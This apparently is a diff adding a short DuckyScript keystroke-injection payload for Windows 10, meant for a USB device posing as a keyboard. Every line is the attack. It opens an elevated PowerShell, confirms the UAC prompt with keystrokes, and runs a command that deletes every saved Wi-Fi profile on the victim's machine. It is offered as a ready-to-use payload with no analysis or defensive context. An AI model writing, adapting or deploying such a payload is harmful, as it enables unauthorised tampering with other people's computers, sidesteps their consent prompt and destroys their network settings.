@@ -1,0 +1,20 @@
+REM Author: JHOJY
+REM Title: TURN OFF!! 
+REM Target: windows 10 
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL+SHIFT+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 500
+STRING netsh wlan delete profile name=*
+DELAY 500
+ENTER
+DELAY 300
+STRING exit
+ENTER
+
